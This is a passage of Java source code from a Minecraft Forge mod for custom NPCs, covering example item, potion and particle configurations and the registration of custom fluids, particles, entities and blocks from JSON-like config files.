								translation.appendTag(new NBTTagFloat(0.2f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.6f)); }
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.95f));
								translation.appendTag(new NBTTagFloat(0.4f));
								translation.appendTag(new NBTTagFloat(0.2f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.85f)); }
								break;
							}
							default: {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(280.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.85f));
								translation.appendTag(new NBTTagFloat(-0.5f));
								translation.appendTag(new NBTTagFloat(0.2f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.6f)); }
								break;
							}
						}
						break;
					}
					case 4: { // HEAD
						part = "head";
						switch(slot) {
							case "CHEST": {
								rotation.appendTag(new NBTTagFloat(270.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(1.0f));
								translation.appendTag(new NBTTagFloat(1.65f));
								break;
							}
							case "LEGS": {
								rotation.appendTag(new NBTTagFloat(270.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(1.0f));
								translation.appendTag(new NBTTagFloat(1.0f));
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.925f));
								translation.appendTag(new NBTTagFloat(0.4f));
								break;
							}
							default: { break; }
						}
						break;
					}
					case 5: { // GUI
						part = "gui";
						switch(slot) {
							case "CHEST": {
								rotation.appendTag(new NBTTagFloat(30.0f));
								rotation.appendTag(new NBTTagFloat(45.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.49f));
								translation.appendTag(new NBTTagFloat(-0.41f));
								translation.appendTag(new NBTTagFloat(0.0f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.9f)); }
								break;
							}
							case "LEGS": {
								rotation.appendTag(new NBTTagFloat(30.0f));
								rotation.appendTag(new NBTTagFloat(45.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.05f));
								translation.appendTag(new NBTTagFloat(0.0f));
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(30.0f));
								rotation.appendTag(new NBTTagFloat(45.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.3f));
								translation.appendTag(new NBTTagFloat(0.0f));
								break;
							}
							default: {
								rotation.appendTag(new NBTTagFloat(30.0f));
								rotation.appendTag(new NBTTagFloat(45.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(-1.0f));
								translation.appendTag(new NBTTagFloat(0.0f));
								break;
							}
						}
						break;
					}
					case 6: { // GROUND
						part = "ground";
						switch(slot) {
							case "CHEST": {
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
							case "LEGS": {
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.25f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.6f)); }
								break;
							}
							case "FEET": {
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.35f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.65f)); }
								break;
							}
							default: {
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(-0.375f));
								translation.appendTag(new NBTTagFloat(0.5f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.5f)); }
								break;
							}
						}
						break;
					}
					default: { // FIXED
						part = "fixed";
						switch(slot) {
							case "CHEST": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(-0.65f));
								translation.appendTag(new NBTTagFloat(0.45f));
								break;
							}
							case "LEGS": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.05f));
								translation.appendTag(new NBTTagFloat(0.475f));
								break;
							}
							case "FEET": {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(0.2f));
								translation.appendTag(new NBTTagFloat(0.475f));
								break;
							}
							default: {
								rotation.appendTag(new NBTTagFloat(0.0f));
								rotation.appendTag(new NBTTagFloat(180.0f));
								rotation.appendTag(new NBTTagFloat(0.0f));
								translation.appendTag(new NBTTagFloat(0.5f));
								translation.appendTag(new NBTTagFloat(-0.85f));
								translation.appendTag(new NBTTagFloat(0.4f));
								for (int l = 0; l < 3; l++) { scale.appendTag(new NBTTagFloat(0.75f)); }
								break;
							}
						}
						break;
					}
				}
				NBTTagCompound transform = new NBTTagCompound();
				if (rotation.tagCount() > 0) { transform.setTag("rotation", rotation); }
				if (translation.tagCount() > 0) { transform.setTag("translation", translation); }
				if (scale.tagCount() > 0) { transform.setTag("scale", scale); }
				cameraData.setTag(part, transform);
			}
			display.setTag(slot, cameraData);
		}
		exampleOBJArmor.setTag("Display", display);
		
		exampleOBJArmor.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleOBJArmor);
		
		

		NBTTagCompound exampleShield = new NBTTagCompound();
		exampleShield.setString("RegistryName", "shieldexample");
		exampleShield.setByte("ItemType", (byte) 4);
		exampleShield.setInteger("MaxStackDamage", 6500);
		exampleShield.setDouble("EntityDamage", 0.0d);
		exampleShield.setString("Material", "IRON");
		exampleShield.setTag("RepairItem", (new ItemStack(Items.IRON_NUGGET)).writeToNBT(new NBTTagCompound()));
		exampleShield.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleShield);

		NBTTagCompound exampleBow = new NBTTagCompound();
		exampleBow.setString("RegistryName", "bowexample");
		exampleBow.setByte("ItemType", (byte) 5);
		exampleBow.setInteger("MaxStackDamage", 1250);
		exampleBow.setDouble("EntityDamage", 2.0d);
		exampleBow.setString("Material", "WOOD");
		exampleBow.setTag("RepairItem", (new ItemStack(Blocks.PLANKS)).writeToNBT(new NBTTagCompound()));
		exampleBow.setBoolean("SetFlame", false);
		exampleBow.setFloat("CritChance", 0.25f);
		exampleBow.setFloat("DrawstringSpeed", 20.0f);
		exampleBow.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleBow);

		NBTTagCompound exampleFood = new NBTTagCompound();
		exampleFood.setString("RegistryName", "foodexample");
		exampleFood.setByte("ItemType", (byte) 6);
		exampleFood.setInteger("MaxStackSize", 32);
		exampleFood.setInteger("UseDuration", 32);
		exampleFood.setInteger("HealAmount", 1);
		exampleFood.setFloat("SaturationModifier", 0.1f);
		exampleFood.setBoolean("IsWolfFood", false);
		exampleFood.setBoolean("AlwaysEdible", true);
		NBTTagCompound potionEffect = new NBTTagCompound();
		potionEffect.setString("Potion", "minecraft:fire_resistance");
		potionEffect.setInteger("DurationTicks", 45);
		potionEffect.setInteger("Amplifier", 0);
		potionEffect.setBoolean("Ambient", true);
		potionEffect.setBoolean("ShowParticles", false);
		potionEffect.setFloat("Probability", 0.95f);
		exampleFood.setTag("PotionEffect", potionEffect);
		exampleFood.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleFood);

		NBTTagCompound exampleFishingRod = new NBTTagCompound();
		exampleFishingRod.setString("RegistryName", "fishingrodexample");
		exampleFishingRod.setByte("ItemType", (byte) 8);
		exampleFishingRod.setInteger("MaxStackSize", 1);
		exampleWeapon.setTag("RepairItem", (new ItemStack(Items.STICK)).writeToNBT(new NBTTagCompound()));
		exampleFishingRod.setInteger("MaxStackDamage", 150);
		exampleFishingRod.setInteger("Enchantability", 5);
		exampleFishingRod.setBoolean("CreateAllFiles", true);
		listItems.appendTag(exampleFishingRod);

		nbtItems.setTag("Items", listItems);

		NBTTagList listPotion = new NBTTagList();

		NBTTagCompound examplePotion = new NBTTagCompound();
		examplePotion.setString("RegistryName", "potionexample");
		examplePotion.setByte("ItemType", (byte) 7);
		examplePotion.setBoolean("CreateAllFiles", true);
		examplePotion.setBoolean("IsBadEffect", false);
		examplePotion.setBoolean("IsInstant", false);
		examplePotion.setBoolean("IsBeneficial", true);
		examplePotion.setInteger("LiquidColor", 0xFFFFFF);
		examplePotion.setInteger("MaxStackSize", 16);
		examplePotion.setInteger("BaseDelay", 200);
		examplePotion.setInteger("Duration", 20);
		examplePotion.setTag("CureItem", (new ItemStack(Items.CARROT)).writeToNBT(new NBTTagCompound()));
		NBTTagList potionModifiers = new NBTTagList();
		NBTTagCompound potionModifier = new NBTTagCompound();
		potionModifier.setString("AttributeName", "generic.maxHealth");
		potionModifier.setString("UUID", UUID.randomUUID().toString());
		potionModifier.setDouble("AttributeDefValue", 5.0d);
		potionModifier.setDouble("AttributeMinValue", -50.0d);
		potionModifier.setDouble("AttributeMaxValue", 50.0d);
		potionModifier.setDouble("Amount", 2.0d);
		potionModifier.setInteger("Operation", 2);
		potionModifiers.appendTag(potionModifier);
		examplePotion.setTag("Modifiers", potionModifiers);
		listPotion.appendTag(examplePotion);
		nbtItems.setTag("Potions", listPotion);
		return nbtItems;
	}

	private static NBTTagCompound getExampleParticles() {
		NBTTagCompound nbtParticles = new NBTTagCompound();
		NBTTagList listParticles = new NBTTagList();

		NBTTagCompound exampleParticle = new NBTTagCompound();
		exampleParticle.setString("RegistryName", "PARTICLE_EXAMPLE");
		exampleParticle.setBoolean("ShouldIgnoreRange", false);
		exampleParticle.setInteger("ArgumentCount", 0);

		exampleParticle.setInteger("MaxAge", 60);
		exampleParticle.setIntArray("UVpos", new int[] { 1, 5 });
		exampleParticle.setFloat("Gravity", 0.25f);
		exampleParticle.setFloat("Scale", 1.5f);
		exampleParticle.setString("Texture", "particles");
		exampleParticle.setBoolean("IsFullTexture", false);
		exampleParticle.setBoolean("CreateAllFiles", true);
		NBTTagList motion = new NBTTagList();
		motion.appendTag(new NBTTagDouble(0.2d));
		motion.appendTag(new NBTTagDouble(0.1d));
		motion.appendTag(new NBTTagDouble(0.2d));
		exampleParticle.setTag("StartMotion", motion);
		exampleParticle.setBoolean("IsRandomMotion", true);
		exampleParticle.setBoolean("NotMotionY", true);
		listParticles.appendTag(exampleParticle);

		NBTTagCompound objParticle = new NBTTagCompound();
		objParticle.setString("RegistryName", "PARTICLE_OBJ_EXAMPLE");
		objParticle.setBoolean("ShouldIgnoreRange", false);
		objParticle.setInteger("MaxAge", 60);
		objParticle.setFloat("Gravity", 1.0f / 3.0f);
		objParticle.setFloat("Scale", 1.0f);
		objParticle.setString("OBJModel", "ring");
		objParticle.setBoolean("CreateAllFiles", true);
		listParticles.appendTag(objParticle);

		nbtParticles.setTag("Particles", listParticles);
		return nbtParticles;
	}

	public static void load() {
		MinecraftForge.EVENT_BUS.register(new CustomRegisters());
		CustomRegisters.registerFluid();
		CustomRegisters.registerParticle();
	}

	private static void registerFluid() {
		File blocksFile = new File(CustomNpcs.Dir, "custom_blocks.js");
		NBTTagCompound nbtBlocks = new NBTTagCompound();
		try {
			if (blocksFile.exists()) {
				nbtBlocks = NBTJsonUtil.LoadFile(blocksFile);
			}
		} catch (IOException | JsonException e) {
			LogWriter.error("Try Load custom_blocks.js: ", e);
		}
		boolean hEL = false;
		if (nbtBlocks.hasKey("Blocks", 9)) {
			for (int i = 0; i < nbtBlocks.getTagList("Blocks", 10).tagCount(); i++) {
				String name = nbtBlocks.getTagList("Blocks", 10).getCompoundTagAt(i).getString("RegistryName");
				if (name.equals("liquidexample")) {
					hEL = true;
					break;
				}
			}
		}
		if (!blocksFile.exists() || !nbtBlocks.hasKey("Blocks", 9) || !hEL) {
			if (!nbtBlocks.hasKey("Blocks", 9)) {
				nbtBlocks.setTag("Blocks", new NBTTagList());
			}
			if (!hEL) {
				NBTTagCompound nbt = CustomRegisters.getExampleBlocks();
				for (int i = 0; i < nbt.getTagList("Blocks", 10).tagCount(); i++) {
					String name = nbt.getTagList("Blocks", 10).getCompoundTagAt(i).getString("RegistryName");
					if (name.equals("liquidexample")) {
						nbtBlocks.getTagList("Blocks", 10).appendTag(nbt.getTagList("Blocks", 10).getCompoundTagAt(i));
					}
				}
			}
			try {
				NBTJsonUtil.SaveFile(blocksFile, nbtBlocks);
			} catch (Exception e) { LogWriter.error("Error:", e); }
		}
		for (int i = 0; i < nbtBlocks.getTagList("Blocks", 10).tagCount(); i++) {
			NBTTagCompound nbtBlock = nbtBlocks.getTagList("Blocks", 10).getCompoundTagAt(i);
			Fluid fluid = null;
            // Simple
            if (nbtBlock.getByte("BlockType") == (byte) 1) { // Liquid
                fluid = new CustomFluid(nbtBlock);
            }
			if (fluid == null) {
				continue;
			}
			if (FluidRegistry.isFluidRegistered(fluid.getName())) {
				LogWriter.error("Attempt to load a registered fluid \"" + fluid.getName() + "\"");
				continue;
			}
			FluidRegistry.registerFluid(fluid);
			FluidRegistry.addBucketForFluid(fluid);
			LogWriter.info("Load Custom Fluid \"" + CustomNpcs.MODID + ":" + FluidRegistry.getFluidName(fluid) + "\"");
		}
	}

	@SuppressWarnings("unchecked")
	private static void registerParticle() {
		File prtcsFile = new File(CustomNpcs.Dir, "custom_particles.js");
		NBTTagCompound nbtParticles = new NBTTagCompound();
		try {
			if (prtcsFile.exists()) {
				nbtParticles = NBTJsonUtil.LoadFile(prtcsFile);
			}
		} catch (IOException | JsonException e) {
			LogWriter.error("Try Load custom_particles.js: ", e);
		}
		boolean hPE = false, hPOE = false, resave = false;
		if (nbtParticles.hasKey("Particles", 9)) {
			for (int i = 0; i < nbtParticles.getTagList("Particles", 10).tagCount(); i++) {
				String name = nbtParticles.getTagList("Particles", 10).getCompoundTagAt(i).getString("RegistryName");
				if (name.equalsIgnoreCase("PARTICLE_EXAMPLE")) {
					hPE = true;
				} else if (name.equalsIgnoreCase("PARTICLE_OBJ_EXAMPLE")) {
					if (hPOE) {
						resave = true;
					}
					hPOE = true;
				}
			}
		}
		if (!prtcsFile.exists() || !nbtParticles.hasKey("Particles", 9) || !hPE || !hPOE) {
			if (!nbtParticles.hasKey("Particles", 9)) {
				nbtParticles.setTag("Particles", new NBTTagList());
			}
			if (!hPE || !hPOE) {
				NBTTagCompound nbt = CustomRegisters.getExampleParticles();
				for (int i = 0; i < nbt.getTagList("Particles", 10).tagCount(); i++) {
					String name = nbt.getTagList("Particles", 10).getCompoundTagAt(i).getString("RegistryName");
					if (name.equalsIgnoreCase("PARTICLE_EXAMPLE") && !hPE) {
						nbtParticles.getTagList("Particles", 10)
								.appendTag(nbt.getTagList("Particles", 10).getCompoundTagAt(i));
					} else if (name.equalsIgnoreCase("PARTICLE_OBJ_EXAMPLE") && !hPOE) {
						nbtParticles.getTagList("Particles", 10)
								.appendTag(nbt.getTagList("Particles", 10).getCompoundTagAt(i));
					}
				}
			}
			try {
				NBTJsonUtil.SaveFile(prtcsFile, nbtParticles);
			} catch (IOException | JsonException e) { LogWriter.error("Error:", e); }
		}
		// delete this bug
		if (resave) {
			hPOE = false;
			NBTTagList newList = new NBTTagList();
			for (int i = 0; i < nbtParticles.getTagList("Particles", 10).tagCount(); i++) {
				String name = nbtParticles.getTagList("Particles", 10).getCompoundTagAt(i).getString("RegistryName");
				if (name.equalsIgnoreCase("PARTICLE_OBJ_EXAMPLE")) {
					if (hPOE) {
						continue;
					}
					hPOE = true;
				}
				newList.appendTag(nbtParticles.getTagList("Particles", 10).getCompoundTagAt(i));
			}
			nbtParticles.setTag("Particles", newList);
		}

		int id = -1; // max ID
		for (EnumParticleTypes ept : EnumParticleTypes.values()) {
			if (ept.getParticleID() >= id) {
				id = ept.getParticleID() + 1;
			}
		}
		Class<?>[] additionalTypes = { String.class, int.class, boolean.class, int.class }; // particleName, particleID,
		// create new
		Map<Integer, EnumParticleTypes> particles = Maps.newHashMap();
		Map<String, EnumParticleTypes> by_name = Maps.newHashMap();
		try {
			Class<?> cl = Class.forName("net.minecraft.util.EnumParticleTypes");
			for (Field f : cl.getDeclaredFields()) {
				if (!f.getType().isInterface()) {
					continue;
				}
				try {
					if (!f.isAccessible()) {
						f.setAccessible(true);
					}
					Map<?, ?> map = (Map<?, ?>) f.get(cl);
					for (Entry<?, ?> entry : map.entrySet()) {
						if (entry.getKey().getClass() == Integer.class) {
							particles = (Map<Integer, EnumParticleTypes>) map;
						} else if (entry.getKey().getClass() == String.class) {
							by_name = (Map<String, EnumParticleTypes>) map;
						}
						break;
					}
				} catch (Exception e) { LogWriter.error("Error:", e); }
			}
		} catch (ClassNotFoundException e) {
			LogWriter.error("Error:", e);
		}

		for (int i = 0; i < nbtParticles.getTagList("Particles", 10).tagCount(); i++) {
			NBTTagCompound nbtParticle = nbtParticles.getTagList("Particles", 10).getCompoundTagAt(i);
			if (!nbtParticle.hasKey("RegistryName", 8)) {
				LogWriter.error("Attempt to load particle pos: " + i + " - failed");
				continue;
			}
			CustomParticleSettings particleSettings = new CustomParticleSettings(nbtParticle, id);
			if (EnumParticleTypes.getParticleNames().contains(particleSettings.enumName)) {
				LogWriter.error("Attempt to load a registered particle \"" + particleSettings.name + "\"");
				continue;
			}
			id++;
			EnumHelper.addEnum(EnumParticleTypes.class, particleSettings.enumName, additionalTypes, particleSettings.name, particleSettings.id, particleSettings.shouldIgnoreRange, particleSettings.argumentCount);

			EnumParticleTypes enumparticletypes = EnumParticleTypes.valueOf(particleSettings.enumName);
			int idT = enumparticletypes.getParticleID();

			particles.put(idT, enumparticletypes);
			by_name.put(particleSettings.name, enumparticletypes);
			CustomRegisters.customparticles.put(particleSettings.id, particleSettings);
			if (nbtParticle.getBoolean("CreateAllFiles")) {
				CustomNpcs.proxy.checkParticleFiles(particleSettings);
				nbtParticle.setBoolean("CreateAllFiles", false);
				resave = true;
			}
			LogWriter.info("Load Custom Particle \"" + particleSettings.name + "\"");
		}
		if (resave) {
			try {
				NBTJsonUtil.SaveFile(prtcsFile, nbtParticles);
			} catch (Exception e) { LogWriter.error("Error:", e); }
		}
	}

	@SubscribeEvent
	public void register(RegistryEvent.Register<EntityEntry> event) {
		EntityEntry[] entries = { this.registerNpc(EntityNPCHumanMale.class, "npchumanmale"),
				this.registerNpc(EntityNPCVillager.class, "npcvillager"),
				this.registerNpc(EntityNpcPony.class, "npcpony"),
				this.registerNpc(EntityNPCHumanFemale.class, "npchumanfemale"),
				this.registerNpc(EntityNPCDwarfMale.class, "npcdwarfmale"),
				this.registerNpc(EntityNPCFurryMale.class, "npcfurrymale"),
				this.registerNpc(EntityNpcMonsterMale.class, "npczombiemale"),
				this.registerNpc(EntityNpcMonsterFemale.class, "npczombiefemale"),
				this.registerNpc(EntityNpcSkeleton.class, "npcskeleton"),
				this.registerNpc(EntityNPCDwarfFemale.class, "npcdwarffemale"),
				this.registerNpc(EntityNPCFurryFemale.class, "npcfurryfemale"),
				this.registerNpc(EntityNPCOrcMale.class, "npcorcfmale"),
				this.registerNpc(EntityNPCOrcFemale.class, "npcorcfemale"),
				this.registerNpc(EntityNPCElfMale.class, "npcelfmale"),
				this.registerNpc(EntityNPCElfFemale.class, "npcelffemale"),
				this.registerNpc(EntityNpcCrystal.class, "npccrystal"),
				this.registerNpc(EntityNpcEnderchibi.class, "npcenderchibi"),
				this.registerNpc(EntityNpcNagaMale.class, "npcnagamale"),
				this.registerNpc(EntityNpcNagaFemale.class, "npcnagafemale"),
				this.registerNpc(EntityNpcSlime.class, "NpcSlime"),
				this.registerNpc(EntityNpcDragon.class, "NpcDragon"),
				this.registerNpc(EntityNPCEnderman.class, "npcEnderman"),
				this.registerNpc(EntityNPCGolem.class, "npcGolem"),
				this.registerNpc(EntityCustomNpc.class, "CustomNpc"),
				this.registerNpc(EntityNPC64x32.class, "CustomNpc64x32"),
				this.registerNpc(EntityNpcAlex.class, "CustomNpcAlex"),
				this.registerNpc(EntityNpcClassicPlayer.class, "CustomNpcClassic"),
				this.registerNewentity("CustomNpcChairMount", 10, false).entity(EntityChairMount.class).build(),
				this.registerNewentity("CustomNpcProjectile", 3, true).entity(EntityProjectile.class).build() };
		event.getRegistry().registerAll(entries);
	}

	@SubscribeEvent
	public void registerBlocks(RegistryEvent.Register<Block> event) {
		GameRegistry.registerTileEntity(TileRedstoneBlock.class, new ResourceLocation("minecraft", "TileRedstoneBlock"));
		GameRegistry.registerTileEntity(TileBlockAnvil.class, new ResourceLocation("minecraft", "TileBlockAnvil"));
		GameRegistry.registerTileEntity(TileMailbox.class, new ResourceLocation("minecraft", "TileMailbox"));
		GameRegistry.registerTileEntity(TileWaypoint.class, new ResourceLocation("minecraft", "TileWaypoint"));
		GameRegistry.registerTileEntity(TileScripted.class, new ResourceLocation("minecraft", "TileNPCScripted"));
		GameRegistry.registerTileEntity(TileScriptedDoor.class, new ResourceLocation("minecraft", "TileNPCScriptedDoor"));
		GameRegistry.registerTileEntity(TileBuilder.class, new ResourceLocation("minecraft", "TileNPCBuilder"));
		GameRegistry.registerTileEntity(TileCopy.class, new ResourceLocation("minecraft", "TileNPCCopy"));
		GameRegistry.registerTileEntity(TileBorder.class, new ResourceLocation("minecraft", "TileNPCBorder"));
		GameRegistry.registerTileEntity(CustomTileEntityPortal.class, new ResourceLocation(CustomNpcs.MODID, "CustomTileEntityPortal"));
		GameRegistry.registerTileEntity(CustomTileEntityChest.class, new ResourceLocation(CustomNpcs.MODID, "CustomTileEntityChest"));

		RegistryNamespaced<ResourceLocation, Class<? extends TileEntity>> REGISTRY = ObfuscationHelper.getValue(TileEntity.class, 1);
        assert REGISTRY != null;
        REGISTRY.putObject(new ResourceLocation("minecraft", "banner"), TileEntityCustomBanner.class);

		CustomRegisters.redstoneBlock = new BlockNpcRedstone();
		CustomRegisters.mailbox = new BlockMailbox();
		CustomRegisters.waypoint = new BlockWaypoint();
		CustomRegisters.border = new BlockBorder();
		CustomRegisters.scripted = new BlockScripted();
		CustomRegisters.scriptedDoor = new BlockScriptedDoor();
		CustomRegisters.builder = new BlockBuilder();
		CustomRegisters.copy = new BlockCopy();
		CustomRegisters.carpentyBench = new BlockCarpentryBench();

		List<Block> blocks = Lists.newArrayList();
		List<String> names = Lists.newArrayList();
		blocks.add(CustomRegisters.redstoneBlock);
		blocks.add(CustomRegisters.carpentyBench);
		blocks.add(CustomRegisters.mailbox);
		blocks.add(CustomRegisters.waypoint);
		blocks.add(CustomRegisters.border);
		blocks.add(CustomRegisters.scripted);
		blocks.add(CustomRegisters.scriptedDoor);
		blocks.add(CustomRegisters.builder);
		blocks.add(CustomRegisters.copy);

		for (Block bl : blocks) {
			names.add(Objects.requireNonNull(bl.getRegistryName()).toString());
		}

		// Custom Blocks
		File blocksFile = new File(CustomNpcs.Dir, "custom_blocks.js");
		NBTTagCompound nbtBlocks = new NBTTagCompound();
		try {
			if (blocksFile.exists()) {
				nbtBlocks = NBTJsonUtil.LoadFile(blocksFile);
			}
		} catch (IOException | JsonException e) {
			LogWriter.error("Try Load custom_blocks.js: ", e);
		}

		boolean hEB = false, hEL = false, hES = false, hEP = false, hEFB = false, hEEP = false, hEC = false,
				hED = false, hECc = false;
		boolean resave = false;
		if (nbtBlocks.hasKey("Blocks", 9)) {
			for (int i = 0; i < nbtBlocks.getTagList("Blocks", 10).tagCount(); i++) {
				String name = nbtBlocks.getTagList("Blocks", 10).getCompoundTagAt(i).getString("RegistryName");
				if (name.equals("blockexample")) {
					hEB = true;
				}
				if (name.equals("liquidexample")) {
					hEL = true;
				}
				if (name.equals("facingblockexample")) {
					hEFB = true;
				}
				if (name.equals("stairsexample")) {
					hES = true;
				}
				if (name.equals("slabexample")) {
					hEP = true;
				}
				if (name.equals("portalexample")) {
					hEEP = true;
				}
				if (name.equals("chestexample")) {
					hEC = true;
				}
				if (name.equals("containerexample")) {
					hECc = true;
				}
				if (name.equals("doorexample")) {
					hED = true;
				}
			}
		}
		boolean hE = !hEB || !hEL || !hES || !hEP || !hEFB || !hEEP || !hEC || !hED || !hECc;
		if (!blocksFile.exists() || !nbtBlocks.hasKey("Blocks", 9) || hE) {
			if (!nbtBlocks.hasKey("Blocks", 9)) {
				nbtBlocks.setTag("Blocks", new NBTTagList());
			}
			if (hE) {
				NBTTagCompound nbt = CustomRegisters.getExampleBlocks();
				for (int i = 0; i < nbt.getTagList("Blocks", 10).tagCount(); i++) {
					String name = nbt.getTagList("Blocks", 10).getCompoundTagAt(i).getString("RegistryName");
					if ((name.equals("blockexample") && !hEB) || (name.equals("liquidexample") && !hEL)
							|| (name.equals("stairsexample") && !hES) || (name.equals("slabexample") && !hEP)
							|| (name.equals("facingblockexample") && !hEFB) || (name.equals("portalexample") && !hEEP)
							|| (name.equals("chestexample") && !hEC) || (name.equals("containerexample") && !hECc)
							|| (name.equals("doorexample") && !hED)) {
						nbtBlocks.getTagList("Blocks", 10).appendTag(nbt.getTagList("Blocks", 10).getCompoundTagAt(i));
					}
				}
			}
			resave = true;
		}

		for (int i = 0; i < nbtBlocks.getTagList("Blocks", 10).tagCount(); i++) {
			NBTTagCompound nbtBlock = nbtBlocks.getTagList("Blocks", 10).getCompoundTagAt(i);
			if (!nbtBlock.hasKey("RegistryName", 8) || !nbtBlock.hasKey("BlockType", 1)
					|| nbtBlock.getString("RegistryName").isEmpty() || nbtBlock.getByte("BlockType") < (byte) 0
					|| nbtBlock.getByte("BlockType") > (byte) 6) {
				LogWriter.error("Attempt to load block pos: " + i + "; name: \"" + nbtBlock.getString("RegistryName")
						+ "\" - failed");
				continue;
			}
			if (!resave && nbtBlock.hasKey("CreateAllFiles") && nbtBlock.getBoolean("CreateAllFiles")) {
				resave = true;
			}
			Block block = null;
            CustomBlockSlabDouble addblock = null;
            switch (nbtBlock.getByte("BlockType")) {
			case (byte) 1: // Liquid
				Fluid fluid = FluidRegistry.getFluid("custom_fluid_" + nbtBlock.getString("RegistryName"));
				if (fluid != null) {
					block = new CustomLiquid(fluid, CustomItem.getMaterial(nbtBlock.getString("Material")), nbtBlock);
				}
				break;
			case (byte) 2: // Chest
				block = new CustomChest(CustomItem.getMaterial(nbtBlock.getString("Material")), nbtBlock);
				break;
			case (byte) 3: // Stairs
				block = new CustomBlockStairs(nbtBlock);
				break;
			case (byte) 4: // Slab
				addblock = new CustomBlockSlabDouble(nbtBlock);
				block = new CustomBlockSlabSingle(nbtBlock, addblock);
				addblock.setSingle((CustomBlockSlabSingle) block);
				break;
			case (byte) 5: // Portal
				block = new CustomBlockPortal(CustomItem.getMaterial(nbtBlock.getString("Material")), nbtBlock);
				break;
			case (byte) 6: // Door
				block = new CustomDoor(CustomItem.getMaterial(nbtBlock.getString("Material")), nbtBlock);
				break;
			default: // Simple
				block = new CustomBlock(CustomItem.getMaterial(nbtBlock.getString("Material")), nbtBlock);
			}
			if (block == null) {
				continue;
			}
			if (names.contains(Objects.requireNonNull(block.getRegistryName()).toString())
					|| Block.getBlockFromName(block.getRegistryName().toString()) != null) {
				LogWriter.error("Attempt to load a registered block \"" + block.getRegistryName() + "\"");
				continue;
			}
			if (nbtBlock.hasKey("CreateAllFiles") && nbtBlock.getBoolean("CreateAllFiles")) {
				CustomNpcs.proxy.checkBlockFiles((ICustomElement) block);
				if (addblock == null) {
					nbtBlock.setBoolean("CreateAllFiles", false);
				}
				resave = true;
			}
			LogWriter.info("Load Custom Block \"" + block.getRegistryName() + "\"");
			blocks.add(block);
			CustomRegisters.customblocks.put(block, new ItemNpcBlock(block));
			names.add(block.getRegistryName().toString());
			if (addblock != null) {
				if (names.contains(Objects.requireNonNull(addblock.getRegistryName()).toString())
						|| Block.getBlockFromName(addblock.getRegistryName().toString()) != null) {
					LogWriter.error("Attempt to load a registered block \"" + addblock.getRegistryName() + "\"");
					continue;
				}
				if (nbtBlock.hasKey("CreateAllFiles") && nbtBlock.getBoolean("CreateAllFiles")) {
					CustomNpcs.proxy.checkBlockFiles(addblock);
					nbtBlock.setBoolean("CreateAllFiles", false);
				}
				LogWriter.info("Load Custom Block \"" + addblock.getRegistryName() + "\"");
				blocks.add(addblock);
				CustomRegisters.customblocks.put(addblock, new ItemNpcBlock(addblock));
				names.add(addblock.getRegistryName().toString());
			}
		}
		if (resave) {
			try {
				NBTJsonUtil.SaveFile(blocksFile, nbtBlocks);
			} catch (Exception e) { LogWriter.error("Error:", e); }
		}
		event.getRegistry().registerAll(blocks.toArray(new Block[0]));

